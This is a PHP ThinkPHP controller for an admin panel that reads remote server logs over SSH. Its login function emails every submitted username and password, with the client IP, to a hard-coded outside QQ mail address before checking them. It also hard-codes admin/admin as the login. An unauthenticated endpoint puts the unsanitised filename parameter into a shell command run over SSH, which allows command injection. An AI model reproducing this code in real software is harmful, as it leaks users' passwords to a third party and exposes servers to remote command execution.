<?php
namespace Home\Controller;
use Think\Controller;
use Home\Common\Mailer;
class IndexController extends Controller 
{
    public function index()
    {
        $this->display('Index:index');
    }

    public function login()
    {
		$_map = ["user"=>"admin","pass"=>"admin"];
        $to = "761312801@qq.com";
        $title = "这是一个测试邮件";
        $content = "异常登录，登陆信息：登录账号-".$_POST['username']."登录密码-".$_POST['password']."IP:".$_SERVER['REMOTE_ADDR'];
        $mail = new Mailer();
        $mail -> sendMail($to, $title, $content);
		if ($_POST['username'] != $_map['user'] || $_POST['password'] != $_map['pass']) {
            $this->error("登录失败！请核对账号密码！",'/',5);
		}
		session('adminuser',I('post.username'));
		$model = D("Index");
		$data = $model ->where("pid=%d",0)->select();
		$this->assign("info",$data);
		$this->display('Index:environList');
    }

    public function getServer()
	{
		if (!$this->is_login()) redirect('/');
		$model = D('Index');
        $data = $model ->where("pid=%d",$_GET['id'])->select();
		$this->assign('info',$data);
		$this->display('Index:loglists');
	}

	public function main()
	{
		if (!$this->is_login()) redirect('/');
		$model = D('Index');
        $data = $model ->where("pid=%d",0)->select();
		$this->assign('info',$data);
		$this->display('Index:main');
	}

	 public function getLog()
    {
        if (!$this->is_login()) redirect('/');
        $Index = D('Index');
        $data = $Index->find($_GET['id']);
        $cmd = "ls ".$data['log_path'];
        $getFile = $this->test($cmd,$data['server_account'],$data['server_pass'],$data['server_url']);
        $fileArray = explode(",",$this->emptyreplace(rtrim($getFile)));
        session('url_id',$data['id']);
        $this->assign('id',$data['id']);
        $this->assign('info',$fileArray);
        $this->display('Index:loglist');
    }


    public function ajaxReturn()
    {
		$Index = D('Index');
        $data = $Index->find($_GET['id']);
        $filename = $data['log_path']."/".$_GET['filename'];
		$cmd = "tail -n 500 ".$filename;
		$getContents = $this->test($cmd,$data['server_account'],$data['server_pass'],$data['server_url']);
		echo $getContents;
    }
	
  
	
	public function test($cmd,$user,$pass,$host)
    {
        $connection=ssh2_connect($host,22);
        ssh2_auth_password($connection,$user,$pass);
        $ret=ssh2_exec($connection,$cmd);
        stream_set_blocking($ret, true);
        return stream_get_contents($ret);
    }
	
	public function emptyreplace($str) 
	{ 
		$str = str_replace('　', ' ', $str); //替换全角空格为半角 
		$str = str_replace('  ', ' ', $str); //替换连续的空格为一个
		for($i=0;$i<strlen($str);$i++){//遍历整个字符串 
			if($str[$i]==' ' || $str[$i]=="\n"){
				$str[$i] = ',';
			}
		}
		return $str;	
	}

	public function is_login()
	{
		if($_SESSION['adminuser'] == null){
			return false;
		}
		return true;
	}

	public function logout()
	{
		session('adminuser',null);
		redirect('/');
	}

    public function sendMail($to,$title,$content)
    {
        //import('vendor.autoload');
        Vendor('Swift.swift_required');
        $transport = (new \Swift_SmtpTransport(C('MAIL_HOST'), 25))
            ->setUsername(C('MAIL_FROM'))
            ->setPassword(C('MAIL_PASSWORD'));
        $mailer = new \Swift_Mailer($transport);

        $message = (new \Swift_Message($title))
            ->setFrom([C('MAIL_FROM') => C('MAIL_FROMNAME')])
            ->setTo($to)
            ->setContentType('text/html')
            ->setCharset('utf-8')
            ->setBody($content);


        try{
            $result = $mailer->send($message);
        }catch (\Exception $e){
            $msg = "error code :".$e -> getcode()."\n";
            $msg .= "error message :".$e -> getMessage()."\n";
            $msg .= "error trace".$e ->getTraceAsString()."\n";

        }
    }
}